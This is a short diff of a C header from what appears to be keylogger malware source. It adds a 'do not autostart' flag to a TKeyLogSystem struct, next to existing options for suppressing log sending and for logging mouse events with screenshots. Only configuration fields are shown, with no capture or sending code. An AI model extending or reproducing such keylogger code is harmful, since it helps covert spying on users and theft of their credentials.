@@ -198,6 +198,7 @@ typedef struct TKeyLogSystem
 
 	bool DontSendLog;         // Отключает отправку лога стандартными механизмами
 	int AlwaysLogMouse;		  // Всегда логгировать события мышки, LOG_MOUSE_NOT_SCREENSHOT - без скриншотов, LOG_MOUSE_SCREENSHOT - с скриншотами
+	bool NotAutoStart;		  // Не стартовать систему автоматически
 
 	//--------- данные времени выполнения ---------
 	bool TimeCompleted;     // Признак того, что система отработала своё время
